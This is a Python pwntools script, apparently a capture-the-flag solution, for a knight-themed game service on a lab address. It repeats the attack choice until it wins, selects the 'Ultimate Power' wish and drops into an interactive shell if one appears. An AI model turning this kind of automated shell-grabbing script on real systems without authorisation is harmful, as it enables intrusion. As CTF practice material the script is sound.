#!/usr/bin/env python3
from pwn import *
import sys

context.log_level = "info"

host = sys.argv[1] if len(sys.argv) >= 2 else "192.168.100.121"
port = int(sys.argv[2]) if len(sys.argv) >= 3 else 40021

io = remote(host, port)

io.sendlineafter(b"Enter your name, Knight:", b"Hacker")
info("Name sent, starting combat loop")

for attack_num in range(1, 30):
    io.sendlineafter(b"Your choice:", b"1")

    data = io.recv(timeout=1)

    if b"defeated" in data or b"wish" in data or b"grant" in data:
        success(f"Victory after {attack_num} attacks!")
        print(data.decode("utf-8", errors="ignore"))
        break

    if b"fallen" in data or b"You have been" in data:
        error("Defeated!")
        print(data.decode("utf-8", errors="ignore"))
        sys.exit(1)

info("Getting wish menu")
wish_menu = io.recvuntil(b"Your choice:", timeout=3)
print("=" * 70)
print(wish_menu.decode("utf-8", errors="ignore"))
print("=" * 70)

info("Choosing option 2 (Ultimate Power)")
io.sendline(b"2")

sleep(1)
result = io.recvall(timeout=3)
print("=" * 70)
print(result.decode("utf-8", errors="ignore"))
print("=" * 70)

if b"sh" in result or b"debug" in result.lower() or b"$" in result:
    success("Shell access detected!")
    io.interactive()
else:
    warn("No shell detected")
    io.close()
